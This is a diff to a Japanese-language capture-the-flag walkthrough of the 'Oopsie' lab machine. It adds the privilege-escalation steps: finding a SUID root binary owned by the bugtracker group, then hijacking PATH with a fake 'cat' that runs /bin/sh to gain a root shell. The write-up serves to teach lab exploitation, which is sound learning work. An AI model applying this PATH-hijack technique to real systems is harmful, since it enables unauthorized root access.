@@ -180,12 +180,26 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 idコマンドでグループを確認する．
 そこで属していたbugtrackerの調査する．
+2> /dev/nullはエラーメッセージの出力を(2>)を存在しない場所(/dev/null)にすることで表示させないようにする．
+これはfindコマンドをルートディレクトリに対して行うと，権限のエラーなどが多く出てきてしまい煩わしいためである．
 
 ```
 robert@oopsie:/$ id
 id
 uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
 
+robert@oopsie:/$ find / -type f -group bugtracker 2> /dev/null
+find / -type f -group bugtracker 2> /dev/null
+/usr/bin/bugtracker
+
+robert@oopsie:/$ ls -l /usr/bin/bugtracker
+ls -l /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+```
+
+ls -l の結果により，bugtrackerはユーザ権限での実行でもroot権限の動作を引用できるためこれを利用する．
+
+```
 robert@oopsie:/$ /usr/bin/bugtracker
 /usr/bin/bugtracker
 
@@ -193,35 +207,23 @@ robert@oopsie:/$ /usr/bin/bugtracker
 : EV Bug Tracker :
 ------------------
 
-Provide Bug ID: 1
-1
+Provide Bug ID: 000
+000
 ---------------
 
-Binary package hint: ev-engine-lib
-
-Version: 3.3.3-1
-
-Reproduce:
-When loading library in firmware it seems to be crashed
-
-What you expected to happen:
-Synchronized browsing to be enabled since it is enabled for that site.
-
-What happened instead:
-Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+cat: /root/reports/000: No such file or directory
 ```
 
+これによりcatコマンドを相対パスで途中で読んでいることがわかるため，パスをいじって参照するcatコマンドを変えればよい．
+以下の通り．
 
 ```
-robert@oopsie:/$ export PATH=/tmp:$PATH
-export PATH=/tmp:$PATH
 robert@oopsie:/$ cd /tmp
 cd /tmp
 robert@oopsie:/tmp$ echo '/bin/sh' > cat
-echo '/bin/sh' > cat
 robert@oopsie:/tmp$ chmod +x cat
-chmod +x cat
-chmod: changing permissions of 'cat': Operation not permitted
+robert@oopsie:/$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
 robert@oopsie:/tmp$ /usr/bin/bugtracker
 /usr/bin/bugtracker
 
@@ -236,9 +238,6 @@ Provide Bug ID: 1
 
 # cd /root
 lcd /root
-# ls
-lls
-/bin/sh: 3: lls: not found
 # ls
 ls
 reports  root.txt  root.txt~
